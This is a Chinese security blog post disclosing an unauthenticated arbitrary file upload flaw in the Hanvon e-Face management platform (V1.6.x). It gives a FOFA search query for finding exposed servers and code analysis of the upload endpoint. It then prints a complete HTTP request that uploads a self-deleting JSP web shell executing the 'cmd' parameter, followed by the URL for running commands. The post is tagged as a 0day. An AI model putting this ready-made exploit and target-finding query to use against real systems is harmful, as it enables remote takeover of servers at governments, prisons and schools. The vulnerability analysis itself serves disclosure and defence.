---
title: "汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-meetingPersonal-uploadMeetingFile-upload-rce.html
asset_dir: assets/汉王e脸通综合管理平台-meetingpersonaluploadmeetingfile.do-任意文件上传漏洞
---

# 汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/15 08:35
- 786浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

应用程序

服务器

application

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `meetingPersonal/uploadMeetingFile.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。

漏洞预警服务

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

看下 `MeetingPersonalController` 的关于 `uploadMeetingFile.do` 的实现

```
@ResponseBody
  @RequestMapping(value = {"uploadMeetingFile.do"}, method = {RequestMethod.POST})
  public RequestJson uploadMeetingFile(HttpServletRequest request, HttpServletResponse response) {
    RequestJson result = new RequestJson();
    try {
      String fileName = null, fileType = null;
      if (!ServletFileUpload.isMultipartContent(request)) {
        result = RequestJson.failuerResult(result, getMessage("system_blacklist_network_error"));
        return result;
      } 
      SessionalUser su = getSessionUser();
      Locale newLocale = TheApp.getLocale(su.getLanguageLocal());
      UserHandlerInterceptor.setLocale(request, response, newLocale);
      MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
      Map<String, MultipartFile> fileMap = multipartRequest.getFileMap();
      String uploadPath = null;
      for (Map.Entry<String, MultipartFile> entity : fileMap.entrySet()) {
        MultipartFile mf = entity.getValue();
        if (!mf.isEmpty()) {
          String fileTypeStr = mf.getOriginalFilename();
          String fileId = UUID.randomUUID().toString().replace("-", "");
          fileName = fileTypeStr.split("\\.")[0];
          fileType = fileTypeStr.split("\\.")[1];
          String path = request.getSession().getServletContext().getRealPath("/resource");
          File tmpFile = new File(path);
          if (!tmpFile.exists())
            tmpFile.mkdir(); 
          uploadPath = path + "/" + fileId + "." + fileType;
          File targetFile = new File(uploadPath);
          logger.error("文件存储地址测试" + uploadPath);
          Files.copy(mf
              .getInputStream(), targetFile
              .toPath(), new CopyOption[] { StandardCopyOption.REPLACE_EXISTING });
          uploadPath = fileId + "." + fileType;
          fileName = fileName + "." + fileType;
        } 
      }
```

直接保存文件到 `resource` 目录，全程无过滤和校验，造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

```
POST /manage/meetingPersonal/uploadMeetingFile.do?recoToken=67mds2pxXQb&type= HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

深入探索

Docker加速服务

技术文章订阅

网络安全会议

访问文件执行命令 `/manage/resource/xxxxx.jsp?cmd=whoami`

[![汉王e脸通综合管理平台 meetingPersonal/uploadMeetingFile.do 任意文件上传漏洞](images/img-001-319fb541773d.webp)](https://image.mrxn.net/0191d8afdcb54470b2b92d8f9cdadaa2.webp)

成功得到 `whoami` [命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
